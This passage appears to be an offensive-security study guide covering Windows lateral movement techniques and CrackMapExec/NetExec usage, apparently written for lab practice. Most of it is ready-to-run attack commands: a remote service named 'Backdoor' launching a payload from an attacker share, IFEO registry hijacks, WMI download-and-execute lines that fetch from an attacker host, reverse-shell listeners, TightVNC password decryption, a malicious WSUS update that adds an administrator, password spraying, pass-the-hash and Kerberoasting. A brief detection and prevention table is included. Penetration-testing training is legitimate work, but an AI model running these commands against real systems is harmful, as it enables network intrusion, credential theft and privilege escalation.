    proxychains4 -q psexec.py DOMAIN/user:'password'@TARGET_IP
  • From Linux - quiet shell with smbexec.py (no file upload): 
    proxychains4 -q smbexec.py DOMAIN/user:'password'@TARGET_IP
  • From Linux - service-based execution with services.py: 
    proxychains4 -q services.py DOMAIN/user:'password'@TARGET_IP create \
  -name 'Backdoor' -display 'Backdoor' -path "\\\\ATTACKER\\share\\payload.exe"
proxychains4 -q impacket-services DOMAIN/user:'password'@TARGET_IP start -name 'Backdoor'
  • From Linux - task-based execution with atexec.py: 
    proxychains4 -q atexec.py DOMAIN/user:'password'@TARGET_IP "powershell -e BASE64"
  • From Windows - use PsExec for interactive shell: 
    .\PsExec.exe \\TARGET -i -u DOMAIN\user -p password cmd
  • From Windows - fileless execution with SharpNoPSExec: 
    .\SharpNoPSExec.exe --target=TARGET_IP --payload="c:\windows\system32\cmd.exe /c PAYLOAD"
  • From Windows - registry-based RCE (IFEO debugger): 
    reg.exe add "\\TARGET\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TARGET_APP.exe" /v Debugger /t reg_sz /d "PAYLOAD"

4.4 Windows Management Instrumentation (WMI)

WMI provides a standardized interface for remote system management. It uses TCP 135 for the initial connection and dynamic ports 49152-65535 for subsequent data. By default, only Administrators can perform remote WMI operations.

4.4.1 WMI Enumeration

# Scan for WMI ports
nmap -p 135,49152-65535 [target-ip] -sV

# Test credentials against WMI with netexec
netexec wmi [target-ip] -u helen -p [password]
proxychains4 -q netexec wmi [target-ip] -u helen -p [password]

4.4.2 Lateral Movement from Windows

# WMIC - query OS info remotely
wmic /node:[target-ip] os get Caption,CSDVersion,OSArchitecture,Version

# WMIC - with explicit credentials
wmic /user:username /password:password /node:[target-ip] os get Caption,CSDVersion,OSArchitecture,Version

# PowerShell WMI - query OS info
Get-WmiObject -Class Win32_OperatingSystem -ComputerName [target-ip] | `
  Select-Object Caption, CSDVersion, OSArchitecture, Version

# WMIC - create a process remotely (e.g., notepad)
wmic /node:[target-ip] process call create "notepad.exe"

# PowerShell - create a process remotely
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" `
  -ComputerName [target-ip]

# PowerShell - with explicit credentials
$credential = New-Object System.Management.Automation.PSCredential("username", `
  (ConvertTo-SecureString "password" -AsPlainText -Force))
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" `
  -ComputerName [target-ip] -Credential $credential

# Execute a reverse shell payload via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://[target-ip]/s')" `
  -ComputerName [target-ip]
Note: WMIC is deprecated as of Windows 10 version 21H1. Use PowerShell cmdlets (Get-WmiObject, Invoke-WmiMethod) instead. WMI itself remains fully supported.

4.4.3 Lateral Movement from Linux

# Install wmic client
sudo apt-get install wmi-client

# Query OS info via wmic from Linux
wmic -U [domain]/helen%RedRiot88 //[target-ip] \
  "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem"

# Execute command via wmiexec.py (needs port 445 for output retrieval)
wmiexec.py [domain]/[user]:'[password]'@[target-ip] whoami

# Suppress output if port 445 is blocked
wmiexec.py [domain]/[user]:'[password]'@[target-ip] whoami -nooutput

# NetExec - run WMI query
proxychains4 -q netexec wmi [target-ip] -u helen -p [password] \
  --wmi "SELECT * FROM Win32_OperatingSystem"

# NetExec - execute command (retrieves output via WMI, not SMB)
proxychains4 -q netexec wmi [target-ip] -u helen -p [password] -x whoami

Methodology

  • Confirm WMI ports and admin rights: 
    proxychains4 -q netexec wmi TARGET_IP -u USER -p PASS
  • From Windows - execute payload via Invoke-WmiMethod: 
    Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload')" `
  -ComputerName TARGET_IP
  • From Linux - execute command via wmiexec.py: 
    proxychains4 -q wmiexec.py DOMAIN/user:'password'@TARGET_IP COMMAND
  • From Linux - execute via netexec (retrieves output without SMB): 
    proxychains4 -q netexec wmi TARGET_IP -u USER -p PASS -x "whoami"

4.5 Windows Remote Management (WinRM)

WinRM is Microsoft's implementation of the WS-Management protocol for remote management via PowerShell. It uses TCP 5985 (HTTP) and TCP 5986 (HTTPS). Members of the Remote Management Users group can connect; administrative rights are not required.

4.5.1 WinRM Enumeration

# Scan for WinRM ports
nmap -p 5985,5986 [target-ip] -sCV

# Test credentials with netexec
netexec winrm [target-ip] -u frewdy -p [password]
Note: (Pwn3d!) in netexec WinRM output means the user has WinRM rights, not necessarily admin rights. Always test credentials against WinRM even for non-admin accounts.

4.5.2 Lateral Movement from Windows

# Execute a command on a remote host
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname; whoami }

# With explicit credentials
$username = "[DOMAIN]\[user]"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Invoke-Command -ComputerName [target-ip] -Credential $credential -ScriptBlock { whoami; hostname }

# winrs - command-line WinRM client
winrs -r:srv02 "powershell -c whoami;hostname"

# winrs - with explicit credentials
winrs /remote:srv02 /username:helen /password:RedRiot88 "powershell -c whoami;hostname"

# Copy files using PSSession
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential

# Upload file to remote host
Copy-Item -ToSession $sessionSRV02 \
  -Path 'C:\Users\helen\Desktop\Sample.txt' \
  -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose

# Download file from remote host
Copy-Item -FromSession $sessionSRV02 \
  -Path 'C:\Windows\System32\drivers\etc\hosts' \
  -Destination 'C:\Users\helen\Desktop\host.txt' -Verbose

# Interactive shell via PSSession
Enter-PSSession $sessionSRV02

# Interactive shell with FQDN (required for Kerberos)
Enter-PSSession srv02.[domain]

# Fix TrustedHosts error (if not using FQDN or Kerberos)
Set-Item WSMan:localhost\client\trustedhosts -value * -Force

# Negotiate auth if Kerberos fails
Enter-PSSession srv02 -Authentication Negotiate

4.5.3 Pass the Ticket via WinRM (Rubeus)

# Forge TGT for target user
.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap

# Create a sacrificial process to hold the ticket
.\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new window - inject the ticket
.\Rubeus.exe ptt /ticket:BASE64TICKET

# Connect using the injected ticket
Enter-PSSession SRV02.[domain] -Authentication Negotiate

4.5.4 PowerShell Web Access

Administrators may configure Windows PowerShell Web Access (PSWA), enabling browser-based PowerShell sessions. Default URL path is /pswa on port 80 or 443.

# Access: https://TARGET_IP/pswa (login with valid credentials)

# For large file transfers via PSWA, use Base64 to avoid slow line-by-line retrieval
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))

# Decode on Linux
cat hosts_base64.txt | base64 -d > hosts

# Fix PowerView LDAP error under PSWA - provide explicit credentials
$username = "[DOMAIN]\[user]"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Get-DomainUser -Credential $credential -FindOne

4.5.5 Lateral Movement from Linux

# NetExec - execute CMD command
netexec winrm [target-ip] -u frewdy -p [password] -x "ipconfig"

# NetExec - execute PowerShell command
netexec winrm [target-ip] -u frewdy -p [password] -X "Get-Process"

# Install Evil-WinRM
sudo apt-get install ruby
sudo gem install evil-winrm

# Connect with Evil-WinRM
evil-winrm -i [target-ip] -u '[domain]\frewdy' -p [password]

# Load PowerShell scripts into session
evil-winrm -i [target-ip] -u '[domain]\frewdy' -p [password] \
  -s '/home/plaintext/'
# Then within the shell, import by name:
# PowerView.ps1
# menu  (shows additional cmdlets loaded)
Note: Evil-WinRM features include Dll-Loader, Donut-Loader, Invoke-Binary, Bypass-4MSI, and built-in upload/download.

Methodology

  • Identify WinRM availability: 
    nmap -p 5985,5986 TARGET_IP -sCV
netexec winrm TARGET_IP -u USER -p PASS
  • From Linux - execute command with netexec: 
    netexec winrm TARGET_IP -u USER -p PASS -x "whoami"
  • From Linux - get interactive shell with Evil-WinRM: 
    evil-winrm -i TARGET_IP -u 'DOMAIN\USER' -p PASSWORD
  • From Windows - remote command execution: 
    Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname }
  • From Windows - interactive session: 
    Enter-PSSession TARGET.domain.local -Authentication Negotiate
  • Transfer files via PSSession: 
    $session = New-PSSession -ComputerName TARGET -Credential $cred
Copy-Item -ToSession $session -Path 'C:\local\file.txt' -Destination 'C:\remote\file.txt'

4.6 Distributed Component Object Model (DCOM)

DCOM extends COM to support communication between objects on different computers over RPC/TCP. It uses TCP 135 for initial communication and dynamic ports 49152-65535 for client-server interactions. Configuration data (CLSID, ProgID, AppID) is stored in the registry.

Membership in the Distributed COM Users group or Administrators group is required. Rights are managed via DCOMCNFG, Group Policy, or the Windows Registry.

4.6.1 DCOM Enumeration

# Scan for DCOM ports
nmap -p 135,49152-65535 [target-ip] -sCV -Pn

4.6.2 Lateral Movement from Windows

MMC20.Application
# Start listener on attack host first (nc -lnvp 8001)

# Create MMC20.Application COM instance on remote host
$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","[target-ip]"))

# Execute command via ExecuteShellCommand
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, `
  "-e BASE64PAYLOAD", 0)
ShellWindows & ShellBrowserWindow
# Find the CLSID for ShellWindows
Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID' | ForEach-Object {
  Get-ItemProperty -Path $_.PSPath | Where-Object {
    $_.'(default)' -eq 'ShellWindows'
  } | Select-Object -ExpandProperty PSChildName
}
# Returns: {9BA05972-F6A8-11CF-A442-00A0C90A8F39}

# Start listener on attack host (nc -lnvp 8080)

# Instantiate ShellWindows via CLSID
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","[target-ip]"))

# Execute payload via ShellExecute
$shell[0].Document.Application.ShellExecute("cmd.exe", `
  "/c powershell -e BASE64PAYLOAD", "C:\Windows\System32", $null, 0)

# ShellBrowserWindow (alternative CLSID)
$shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","SRV02"))
$shell[0].Document.Application.ShellExecute("cmd.exe", "/c PAYLOAD", "C:\Windows\System32", $null, 0)

4.6.3 Lateral Movement from Linux (dcomexec.py)

dcomexec.py provides an interactive shell using DCOM endpoints (MMC20, ShellWindows, ShellBrowserWindow) and retrieves output via ADMIN$ over TCP 445.

# Start listener on attack host (nc -lnvp 8080)

# Execute via MMC20 DCOM object
proxychains4 -q python3 dcomexec.py -object MMC20 \
  INLANEFREIGHT/Josias:'Jonny25'@[target-ip] \
  "powershell -e BASE64PAYLOAD" -silentcommand

# Alternative objects: ShellWindows, ShellBrowserWindow
proxychains4 -q python3 dcomexec.py -object ShellWindows \
  INLANEFREIGHT/Josias:'Jonny25'@[target-ip] \
  "powershell -e BASE64PAYLOAD" -silentcommand

# If TCP 445 is unavailable, suppress output
proxychains4 -q python3 dcomexec.py -object MMC20 \
  INLANEFREIGHT/Josias:'Jonny25'@[target-ip] "COMMAND" -no-output

Methodology

  • Confirm DCOM ports (TCP 135 + dynamic range): 
    nmap -p 135,49152-65535 TARGET_IP -sCV -Pn
  • From Windows - instantiate MMC20.Application and execute payload: 
    $mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe", $null, "-e BASE64PAYLOAD", 0)
  • From Windows - instantiate ShellWindows and execute payload: 
    $shell = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
$shell[0].Document.Application.ShellExecute("cmd.exe", "/c PAYLOAD", "C:\Windows\System32", $null, 0)
  • From Linux - execute via dcomexec.py: 
    proxychains4 -q python3 dcomexec.py -object MMC20 \
  DOMAIN/user:'password'@TARGET_IP "PAYLOAD" -silentcommand

4.7 Secure Shell (SSH)

SSH is an encrypted protocol for remote management. On Windows, OpenSSH can be installed and uses TCP 22. By default, all user accounts can interact with SSH even without specific privileges configured, making it attractive for lateral movement.

4.7.1 SSH Enumeration

# Scan for SSH
nmap [target-ip] -p 22 -sCV -Pn

# Test credentials with netexec
netexec ssh [target-ip] -u ambioris -p '[password]'

4.7.2 SSH Connection (Linux and Windows)

# Connect from Linux with password
ssh [email protected]

# Connect from Windows (PowerShell)
ssh ambioris@[host]

4.7.3 Private Key Authentication

# Connect with private key (from Windows)
ssh -i C:\helen_id_rsa -l [email protected] -p 22 [host]

# Fix "permissions too open" error - copy key to a user-owned directory
copy C:\helen_id_rsa C:\Users\Ambioris\

# Verify permissions (BUILTIN\Users should be absent)
icacls.exe helen_id_rsa

# Retry with fixed permissions
ssh -i C:\Users\Ambioris\helen_id_rsa -l [email protected] -p 22 [host]
Note: Private key authentication is limited to local interaction and cannot be used for network-based authentication (no Pass the Hash equivalent).

Methodology

  • Scan for SSH on target: 
    nmap TARGET_IP -p 22 -sCV -Pn
netexec ssh TARGET_IP -u USER -p PASS
  • Connect with password credentials: 
    ssh USER@TARGET_IP
  • If a private key is found, fix permissions and authenticate: 
    chmod 600 /path/to/private_key
ssh -i /path/to/private_key USER@TARGET_IP
  • Use SCP for file transfer via SSH: 
    scp -i /path/to/key USER@TARGET_IP:/remote/file ./local_file

4.8 Remote Management Tools (VNC / AnyDesk / TeamViewer)

Remote management tools such as VNC, AnyDesk, and TeamViewer are common in corporate environments. If credentials for these tools are found, they can be abused for lateral movement (MITRE T1219). VNC uses the Remote Frame Buffer (RFB) protocol and runs on TCP 5900 by default.

4.8.1 VNC from Windows (TightVNC)

# Check if VNC is running on target
Test-NetConnection -ComputerName SRV02 -Port 5900

# Extract TightVNC password from registry (on a machine you have admin access to)
reg query HKLM\SOFTWARE\TightVNC\Server /s
# Look for: Password    REG_BINARY    816ECB5CE758EAAA

# Decrypt the TightVNC password (on Linux)
# DES key: e84ad660c4721ae0, IV: 0000000000000000
echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
  -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
# Decrypted output reveals plaintext password
# Connect from Linux with xtightvncviewer
sudo apt-get install xtightvncviewer

echo VNCFake1 | proxychains4 -q vncviewer [target-ip] -autopass

# Optimized for slow connections
echo VNCFake1 | proxychains4 -q vncviewer [target-ip] -autopass \
  -quality 0 -nojpeg -compresslevel 1 -encodings "tight hextile" -bgr233
Note: VNC captures only the console session. Administrators often reuse VNC passwords across machines, so a password extracted from one host is worth testing everywhere.

Methodology

  • Scan for VNC port on targets: 
    Test-NetConnection -ComputerName TARGET -Port 5900
  • Extract and decrypt TightVNC credentials from registry: 
    reg query HKLM\SOFTWARE\TightVNC\Server /s
    echo -n REG_BINARY_VALUE | xxd -r -p | openssl enc -des-cbc --nopad --nosalt \
  -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
  • Connect via VNC from Linux: 
    echo VNCPASSWORD | proxychains4 -q vncviewer TARGET_IP -autopass

4.9 Software Deployment and Remote Management Tools

IT management platforms such as MeshCentral, SCCM, PDQ Deploy, ManageEngine, and Kaseya VSA can be abused for lateral movement. If credentials for these tools are obtained, their legitimate remote execution features can deliver payloads to managed endpoints.

MeshCentral installs an agent on managed machines that connects to the management server via TCP 443. Even on highly segmented machines, this outbound connection may remain open.

4.9.1 MeshCentral Enumeration

# Identify MeshCentral on a target
nmap -p 443 [target-ip] -sC -sV
# Look for: http-title: MeshCentral - Login

4.9.2 MeshCentral Abuse

With valid credentials, navigate to My Devices, select the target device, then click the Terminal tab and Connect for a remote shell session.

Note: Read the documentation of any management tool found in the environment to identify remote execution functionality. Creativity is key when faced with unknown software.

4.10 Windows Server Update Services (WSUS)

WSUS distributes Microsoft updates across a Windows environment. Because WSUS is trusted by managed clients, a malicious update signed by a legitimate Microsoft binary can force arbitrary command execution on any machine configured to use that WSUS server.

Required rights: membership in the Administrators group or WSUS Administrators group on the WSUS server. The WSUS Server must also be configured on the target to accept updates.

Note: WSUS is restricted to executing only Microsoft-signed binaries. PsExec64.exe from Sysinternals is a signed Microsoft binary that can be used as the payload wrapper.

4.10.1 WSUS Enumeration

# Check if WSUS is configured on current machine
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer

# Locate WSUS server with SharpWSUS
.\SharpWSUS.exe locate

# Inspect WSUS server (run as Administrator on the WSUS server)
.\SharpWSUS.exe inspect

4.10.2 Create and Deploy Malicious Patch

# Step 1: Create the malicious update (on the WSUS server, run as Administrator)
.\SharpWSUS.exe create `
  /payload:"C:\Tools\sysinternals\PSExec64.exe" `
  /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" `
  /title:"NewAccountUpdate"
# Output includes update ID and approve/check/delete commands

# Step 2: Approve the update for a target computer
.\SharpWSUS.exe approve /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
  /computername:srv01.[domain] /groupname:"FastUpdates"

# Step 3: Check update status
.\SharpWSUS.exe check /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
  /computername:srv01.[domain]

# Step 4: Clean up after execution
.\SharpWSUS.exe delete /updateid:812772ce-0d8b-414b-823b-2cbc97d76126 `
  /computername:srv02.[domain]

4.10.3 Fix: PSExec Download Failure

If the update fails to download (Event ID 364), copy PSExec64.exe directly to the expected path in the WsusContent directory.

# Find the expected destination path from Event Viewer
Get-WinEvent -LogName Application | Where-Object { $_.Id -eq 364 } | fl

# Copy PSExec64.exe to the required path
copy C:\Tools\sysinternals\PSExec64.exe `
  C:\WSUS\WsusContent\02\0098C79E1404B4399BF0E686D88DBF052269A302.exe

Methodology

  • Identify WSUS server address: 
    reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
.\SharpWSUS.exe locate
  • Inspect managed computers and groups: 
    .\SharpWSUS.exe inspect
  • Create the malicious update using PSExec64.exe as carrier: 
    .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" `
  /args:"-accepteula -s -d cmd.exe /c COMMAND" /title:"UpdateTitle"
  • Approve the update for the target machine: 
    .\SharpWSUS.exe approve /updateid:UPDATE_ID /computername:TARGET.FQDN /groupname:"GroupName"
  • Monitor until update is installed, then verify result: 
    .\SharpWSUS.exe check /updateid:UPDATE_ID /computername:TARGET.FQDN
net localgroup administrators
  • Clean up the malicious update: 
    .\SharpWSUS.exe delete /updateid:UPDATE_ID /computername:TARGET.FQDN

4.11 General Considerations

Administrative rights are not always required. Services such as PSRemoting, RDP, WMI, DCOM, and SSH permit non-administrator access. Test all obtained credentials against every available service.

4.11.1 Discovering Non-Default Ports

# List all listening ports with associated PIDs
netstat -ano

# Identify the process behind a port
tasklist /svc /FI "PID eq 336"
# Example: svchost.exe running TermService on port 23389 = RDP on non-default port

4.11.2 IPv6 Firewall Bypass

IPv6 is enabled by default on Windows and is frequently overlooked by firewall rules. If IPv4 connections are blocked, IPv6 may bypass restrictions.

# WinRM connection over IPv6
Enter-PSSession -ComputerName [dead:beef::647f:620f:3a1a:e978] -Authentication Negotiate

# RDP over IPv6 - specify address in mstsc or xfreerdp
# xfreerdp /v:[dead:beef::647f:620f:3a1a:e978] /u:USER ...

4.12 Detection and Prevention

4.12.1 Detection Methods

Method Tool / Approach What to Look For
Authentication Log Monitoring Event Viewer, SIEM Event ID 4624 (success), 4625 (failure) - logins at odd hours or from unexpected IPs
Network Traffic Analysis Wireshark, Network Monitor Unusual lateral communications between systems, non-standard ports or protocols
Endpoint Detection EDR solutions PsExec, PowerShell, WMI, DCOM process spawning from unexpected parents
Honeypots / Deception KFSensor, sshesame, fake SMB shares Any access to decoy resources indicates active lateral movement 
# Filter Event Viewer for logon events (PowerShell)
Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -or $_.Id -eq 4625 } | `
  Select-Object TimeCreated, Id, Message | Format-List

4.12.2 Prevention Methods

Control Implementation
Network Segmentation VLANs and subnets; Windows Firewall rules between segments.
Least Privilege Assign minimum rights via AD and GPOs; audit regularly to revoke unnecessary rights.
Zero Trust Architecture Verify all access requests regardless of origin; Azure AD Conditional Access; micro-segmentation.

5. CrackMapExec

CrackMapExec (CME) is a post-exploitation framework designed to assess and attack Active Directory environments at scale. It wraps a large number of attack techniques - from password spraying and Kerberoasting to credential dumping and lateral movement - behind a single, protocol-aware CLI. NetExec (nxc) is the community-maintained fork and direct successor; commands are interchangeable unless noted.

ProtocolDefault PortKey Use Cases
SMB445Share enum, PTH, credential dump, exec, modules
WinRM5985 / 5986Remote management, exec
MSSQL1433SQL queries, xp_cmdshell, file transfer
LDAP389 / 636AD enum, ASREPRoast, Kerberoast, BloodHound
SSH22Auth testing
RDP3389Screenshots, NLA check
FTP21Auth testing

5.1 Installation & Configuration

5.1.1 Poetry (Recommended)

Poetry isolates the CME virtualenv and makes building custom modules straightforward.

# Clone and install
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
poetry install
poetry run crackmapexec --help

# Run without activating venv every time
poetry shell

5.1.2 pip / pipx

pip install crackmapexec
# or
pipx install crackmapexec

5.1.3 Docker

docker pull byt3bl33d3r/crackmapexec
docker run -it --entrypoint=/bin/sh byt3bl33d3r/crackmapexec

5.1.4 Precompiled Binaries

GitHub Releases page ships standalone ELF binaries that require no Python environment.

wget https://github.com/Porchetta-Industries/CrackMapExec/releases/latest/download/cme-ubuntu-latest -O cme
chmod +x cme && sudo mv cme /usr/local/bin/crackmapexec

5.1.5 NetExec (Maintained Fork)

# Install NetExec
pip install netexec
# or
pipx install netexec

# Use 'nxc' or 'netexec' instead of 'crackmapexec'
nxc smb [target-ip] -u admin -p '[password]'

5.1.6 Configuration File

CME stores its config at ~/.cme/cme.conf and per-protocol databases under ~/.cme/workspaces/default/.

cat ~/.cme/cme.conf
# [CME]
# workspace = default
# last_used_db = smb
# pwn3d_label = Pwn3d!
# audit_mode =

5.1.7 Audit Mode

Replaces passwords/hashes in terminal output with a masking character - useful when screenshotting for reports.

# Edit cme.conf:
# audit_mode = #

# Output will show hashes/passwords as ########
crackmapexec smb [target-ip] -u robert -p [password].txt
# SMB ... [domain]\robert:######## (Pwn3d!)

5.2 Understanding Output

5.2.1 Account Status Indicators

ColorMeaning
Green [+]Valid credentials - authentication succeeded
Red [-]Invalid credentials
Magenta [+] ... (Pwn3d!)Valid credentials AND local admin on target

5.2.2 Protocol Banner Fields

SMB   [target-ip]  445  [dc]  [*] Windows 10.0 Build 17763 x64
      (name:[dc]) (domain:[domain]) (signing:True) (SMBv1:False)

5.2.3 Continue on Success

By default CME stops on the first valid credential. Use --continue-on-success for password spraying when multiple accounts may share the same password.

crackmapexec smb [target-ip] -u users.txt -p '[password]' --continue-on-success

5.3 SMB Enumeration

5.3.1 NULL / Anonymous Sessions

SMB NULL sessions allow unauthenticated enumeration if the server permits them.

# NULL session
crackmapexec smb [target-ip] -u "" -p ""

# Anonymous session
crackmapexec smb [target-ip] -u "anonymous" -p ""

# RID brute without credentials - enumerate domain users
crackmapexec smb [target-ip] -u "" -p "" --rid-brute

5.3.2 Host & Domain Information

# OS, hostname, signing, SMBv1 status
crackmapexec smb [target-ip] -u grace -p '[password]'

5.3.3 Share Enumeration

# List shares and permissions
crackmapexec smb [target-ip] -u grace -p '[password]' --shares

# Generate a list of hosts without SMB signing (relay candidates)
crackmapexec smb [target-ip]/24 --gen-relay-list relay_targets.txt

5.3.4 Share Spidering

# Spider a specific share with a pattern filter
crackmapexec smb [target-ip] -u grace -p '[password]' --spider IT \
  --pattern password

# Spider with regex
crackmapexec smb [target-ip] -u grace -p '[password]' --spider IT \
  --regex '.*\.txt$'

# Search file content (slow - reads every file)
crackmapexec smb [target-ip] -u grace -p '[password]' --spider IT \
  --content --pattern password

# spider_plus module - comprehensive, saves output to JSON
crackmapexec smb [target-ip] -u grace -p '[password]' \
  -M spider_plus --options
crackmapexec smb [target-ip] -u grace -p '[password]' \
  -M spider_plus -o DOWNLOAD_FLAG=True

5.3.5 User & Session Enumeration

# Logged-on users
crackmapexec smb [target-ip] -u grace -p '[password]' --loggedon-users

# Active sessions
crackmapexec smb [target-ip] -u grace -p '[password]' --sessions

# Domain computers
crackmapexec smb [target-ip] -u grace -p '[password]' --computers

# RID brute (enumerate users by RID)
crackmapexec smb [target-ip] -u grace -p '[password]' --rid-brute

# Groups and local groups
crackmapexec smb [target-ip] -u grace -p '[password]' --groups
crackmapexec smb [target-ip] -u grace -p '[password]' --local-groups

# Disk enumeration
crackmapexec smb [target-ip] -u grace -p '[password]' --disks

# WMI queries
crackmapexec smb [target-ip] -u grace -p '[password]' \
  --wmi "SELECT * FROM Win32_ComputerSystem"

5.3.6 LAPS Password Retrieval

# Read LAPS managed local admin password
crackmapexec smb [target-ip] -u grace -p '[password]' --laps

5.4 LDAP Enumeration

5.4.1 Basic LDAP Queries

# Get domain SID
crackmapexec ldap [target-ip] -u grace -p '[password]' --get-sid

# Accounts with "password not required" flag
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  --password-not-required

# Unconstrained delegation
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  --trusted-for-delegation

# Admin count = 1 (protected accounts)
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  --admin-count

# Group Managed Service Account passwords
crackmapexec ldap [target-ip] -u grace -p '[password]' --gmsa

5.4.2 Useful LDAP Modules

# Enumerate AD subnets
crackmapexec ldap [target-ip] -u grace -p '[password]' -M subnets

# Dump domain DNS zones
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  -M get-network -o ALL=true

# Maximum Account Quota (how many machines a user can join)
crackmapexec ldap [target-ip] -u grace -p '[password]' -M MAQ

# Read DACL entries for an object
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  -M daclread -o TARGET=julio ACTION=read

# Read user descriptions (often contain passwords)
crackmapexec ldap [target-ip] -u grace -p '[password]' -M user-desc

# Enumerate group membership for a user
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  -M groupmembership -o USER=julio

# Check LDAP signing status
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  -M ldap-signing

# Check for AD CS (certificate services) misconfiguration
crackmapexec ldap [target-ip] -u grace -p '[password]' -M adcs

# Whoami (confirms LDAP auth and shows current user details)
crackmapexec ldap [target-ip] -u grace -p '[password]' -M whoami

# LAPS via LDAP
crackmapexec ldap [target-ip] -u grace -p '[password]' -M laps

# Detect LDAP channel binding
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  -M ldap-checker

5.5 Password Attacks

5.5.1 Password Spraying

Spraying tests one or a few passwords against many accounts to avoid account lockout. Always check the lockout policy before spraying.

Methodology: Password Spray with CME
  • Determine password policy (lockout threshold, observation window)
  • Collect valid usernames (RID brute, LDAP, Kerbrute)
  • Spray one password at a time, leaving observation window between attempts
  • Use --continue-on-success to collect all valid creds
  • Spray against multiple protocols (SMB, WinRM, LDAP, MSSQL)
# Spray against SMB
crackmapexec smb [target-ip] -u users.txt -p '[password]' \
  --continue-on-success

# Spray against WinRM
crackmapexec winrm [target-ip] -u users.txt -p '[password]' \
  --continue-on-success

# Spray against LDAP
crackmapexec ldap [target-ip] -u users.txt -p '[password]' \
  --continue-on-success

# Spray against MSSQL
crackmapexec mssql [target-ip] -u users.txt -p '[password]' \
  --continue-on-success

# From user notes - password spray via crackmapexec
crackmapexec smb [target-ip] -u users.txt -p "password"

5.5.2 Local Authentication

# Authenticate as a local account (not domain account)
crackmapexec smb [target-ip] -u Administrator -p '[password]' --local-auth

# Local auth spray across a subnet
crackmapexec smb [target-ip]/24 -u Administrator -p '[password]' --local-auth \
  --continue-on-success

5.5.3 Pass-the-Hash (PtH)

CME accepts NT hashes directly with the -H flag.

crackmapexec smb [target-ip] -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901973d9a344

# PtH with local auth
crackmapexec smb [target-ip] -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901973d9a344 \
  --local-auth

5.5.4 UAC & LocalAccountTokenFilterPolicy

Windows UAC remote restrictions block PtH for non-RID-500 local accounts unless LocalAccountTokenFilterPolicy is set to 1. Domain accounts in the Administrators group are unaffected.

Account TypeDefault UAC BehaviorFix
Local Admin (RID 500)Full token - Pwn3d! worksN/A
Local Admin (other RID)Filtered token - no Pwn3d!Set LocalAccountTokenFilterPolicy=1
Domain AdminFull token - Pwn3d! worksN/A

5.6 Kerberos Attacks via CME

5.6.1 ASREPRoasting

Targets accounts that have Kerberos pre-authentication disabled. CME uses the LDAP protocol and the --asreproast flag.

# Find and dump AS-REP hashes
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  --asreproast asrep_hashes.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

5.6.2 Kerberoasting

Requests service tickets for all accounts with SPNs and extracts the encrypted portion for offline cracking.

# Dump Kerberoastable hashes via LDAP protocol
crackmapexec ldap [target-ip] -u grace -p '[password]' \
  --kerberoasting kerberoast_hashes.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

5.6.3 Kerberos Authentication in CME

From CME 5.4.0 onward, Kerberos authentication works without exporting KRB5CCNAME when using username + password. FQDN must be in /etc/hosts.

# Add DC FQDN to /etc/hosts
echo "[target-ip] [dc].[domain] [dc] [domain] [domain]" \
  | sudo tee -a /etc/hosts

# Kerberos auth with username + password
